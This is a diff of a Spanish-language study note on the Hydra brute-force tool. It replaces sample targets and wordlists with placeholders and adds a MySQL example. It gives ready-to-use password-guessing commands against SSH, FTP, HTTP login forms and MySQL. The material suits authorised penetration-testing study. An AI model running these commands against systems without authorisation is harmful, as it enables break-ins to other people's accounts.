@@ -19,24 +19,29 @@ Es una herramienta de [[Fuerza Bruta y Cracking de Contraseñas]] y ataques de d
 Comando básico:
 
 ```
-hydra -l <usuario> -P <diccionario> <protocolo>://<IP>
+hydra -l <usuario> -P <fichero de contraseñas> <protocolo>://<IP> 
 ```
 
 SSH:
 
 ```
-hydra -l root -P rockyou.txt ssh://192.168.1.10
+hydra -l <usuario> -P <fichero de contraseñas> ssh://<IP>
 ```
 
 FTP:
 
 ```
-hydra -l admin -P passwords.txt ftp://192.168.1.10
+hydra -l <usuario> -P <fichero de contraseñas> ftp://<IP>
 ```
 
 HTTP POST form:
 
 ```
-hydra -L users.txt -P diccionario.txt http-post-form://192.168.1.10/login.php:username=^USER^&password=^PASS^:F=Incorrecto
+hydra -l <usuario> -P  <fichero de contraseñas> http-post-form://[IP]/login.php:username=^USER^&password=^PASS^:F=Incorrecto
 ```
 
+MySQL:
+
+```
+hydra -l <usuario> -P <fichero de contraseñas> mysql://<IP>
+```
